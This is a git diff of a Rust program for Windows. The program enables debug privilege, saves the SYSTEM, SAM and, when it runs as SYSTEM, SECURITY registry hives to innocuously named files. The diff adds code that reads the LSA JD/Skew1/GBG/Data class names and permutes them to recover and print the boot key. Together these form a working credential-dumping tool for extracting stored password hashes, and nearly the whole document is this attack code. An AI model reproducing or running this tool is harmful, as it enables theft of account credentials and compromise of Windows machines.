@@ -6,6 +6,7 @@ use std::env::{
 };
 
 use winapi::um::winreg::{
+    RegQueryInfoKeyW,
     RegOpenKeyExA,
     RegSaveKeyA
 };
@@ -16,6 +17,7 @@ use winapi::um::processthreadsapi::{
     OpenProcessToken,
     GetCurrentProcess
 };
+
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::winnt::{
     HANDLE,
@@ -26,14 +28,21 @@ use winapi::um::winnt::{
     TOKEN_ELEVATION, 
     TokenElevation
 };
+
 use winapi::um::securitybaseapi::{
     GetTokenInformation,
     AdjustTokenPrivileges
 };
 
-use winapi::shared::minwindef::FALSE;
 use winapi::shared::minwindef::{
     HKEY, 
+    MAX_PATH,
+    FALSE
+};
+
+use hex::{
+    decode,
+    encode
 };
 
 const SE_DEBUG_NAME: [u16 ; 17] =  [83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
@@ -67,20 +76,27 @@ fn main() {
         println!("{_result}");
     }    
 
+    let scrambled_key = collect_classnames();
+    let key = encode(get_bootkey(scrambled_key));
+    
+    println!("Bootkey: {}", key);
+
     // dump SYSTEM
     let handle = open_regkey("SYSTEM".to_string());
     let dest_file = format!("{current_location}\\sistemino.txt");
     save_regkey(handle, dest_file);
-
-    // dump SECURITY, need SYSTEM privs
-    //let handle = open_regkey("SECURITY".to_string());
-    //let dest_file = format!("{current_location}\\secco.txt");
-    //save_regkey(handle, dest_file);
-
+    
     // dump SAM
     let handle = open_regkey("SAM".to_string());
     let dest_file = format!("{current_location}\\samantha.txt");
     save_regkey(handle, dest_file);
+    
+    if is_system() {
+        // dump SECURITY, need SYSTEM privs
+        let handle = open_regkey("SECURITY".to_string());
+        let dest_file = format!("{current_location}\\secco.txt");
+        save_regkey(handle, dest_file);
+    }
 
 }
 
@@ -104,6 +120,62 @@ fn is_elevated() -> bool {
     }
 }
 
+//cheks if you are SYSTEM
+fn is_system() -> bool {
+    if format!("{}", whoami::username()).to_lowercase() == "system" {
+        return true;
+    }
+    return false;
+}
+
+fn get_bootkey(input: String) -> Vec<u8> {
+    let mut bootkey = vec![];
+    let class = decode(input).expect("bootkey decoding failed");
+    let permut_vector: Vec<usize> = vec![8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7];
+
+    for index in permut_vector {
+        bootkey.push(class[index] as u8);
+    }
+    return bootkey;
+}
+
+fn read_classname(handle: HKEY) -> String {
+    unsafe {
+        let mut class: [u16; MAX_PATH] = std::mem::zeroed();
+        let mut class_size = MAX_PATH as *mut u32;
+
+        if RegQueryInfoKeyW(
+            handle,
+            class.as_mut_ptr(),
+            &mut class_size as *mut _ as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            std::mem::zeroed(),
+        ) != 0 {
+            println!("Error getting classname: {}", Error::last_os_error());
+        }
+        let u8slice : &[u8] = std::slice::from_raw_parts(class.as_ptr() as *const u8, class.len());
+        return std::string::String::from_utf8_lossy(&u8slice).replace("\u{0}", "");
+    }
+}
+
+fn collect_classnames() -> String {
+    let keys = vec!["SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data"];
+    let mut result = String::new();
+
+    for key in keys {
+        let hkey = open_regkey(key.to_string());
+        result.push_str(read_classname(hkey).as_str());
+    }
+
+    return result;
+}
 
 fn enable_debug_privilege(ptr_privilege: *const u16) -> (bool, String) {
     unsafe {
@@ -148,14 +220,18 @@ fn open_regkey(subkey: String) -> HKEY {
         let location = format!("{}", subkey);
         let cstring = CString::new(location).unwrap();
 
-        if RegOpenKeyExA(
+        let result = RegOpenKeyExA(
             0x80000002 as HKEY, //HKLM
             cstring.as_ptr(),
             0x0,
             0xF003F, //0x19 ??
             &mut hkey,
-        ) != 0 {
-            println!("RegOpenKeyExA error: {}", Error::last_os_error());
+        );
+        
+        match result {
+            0 => (),
+            5 => println!("RegOpenKeyExA error: 5, \"Access denied\""),
+            _ => println!("RegOpenKeyExA error: {result}"),
         }
 
         hkey
@@ -177,5 +253,3 @@ fn save_regkey(key: HKEY, destination: String) {
         }
     }
 }
-
-
